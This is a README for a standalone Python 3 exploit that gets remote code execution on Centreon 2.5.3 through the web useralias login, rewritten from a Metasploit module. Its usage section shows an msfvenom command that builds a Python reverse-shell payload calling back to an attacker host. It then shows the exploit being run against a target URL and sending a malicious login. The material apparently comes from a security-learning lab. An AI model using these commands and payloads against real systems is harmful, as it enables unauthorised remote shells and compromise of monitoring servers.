# Centreon 2.5.3 Reverse Shell RCE via web useralias login
Standalone Python 3 reverse shell remote code exploit for Centreon 2.5.3, rewritten from [this Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/centreon_useralias_exec.rb)

Writeup [here](https://ivanitlearning.wordpress.com/2019/10/11/ruby-exploit-rewrite-centreon-2-5-3-web-useralias-rce/) on setting up the target and exploit explanation


Tested with Python 3.7 on target Centreon 2.5.3 running on
* mysql 5.7
* php 5.6.40
* Ubuntu Server 16.04.6 LTS

## Usage
```
root@Kali:~/Infosec/RubyStuff/Centreon-2.5.3# msfvenom --platform python -a python -p python/shell_reverse_tcp LHOST=192.168.92.134 LPORT=4445 -f raw -o payload.py
No encoder or badchars specified, outputting raw payload
Payload size: 397 bytes
Saved as: payload.py
root@Kali:~/Infosec/RubyStuff/Centreon-2.5.3# ./centreon-2.5.3.py -h
usage: centreon-2.5.3.py [-h] -url URL -py PY

Required arguments:
  -url URL  URL of the Centreon login eg. http://192.168.92.152/centreon
  -py PY    Path to Python payload eg. payload.py in working dir
root@Kali:~/Infosec/RubyStuff/Centreon-2.5.3# ./centreon-2.5.3.py -url http://192.168.92.152/centreon -py payload.py 
Version Detected: 2.5.3
Target is vulnerable, proceeding...
Sending malicious login
```
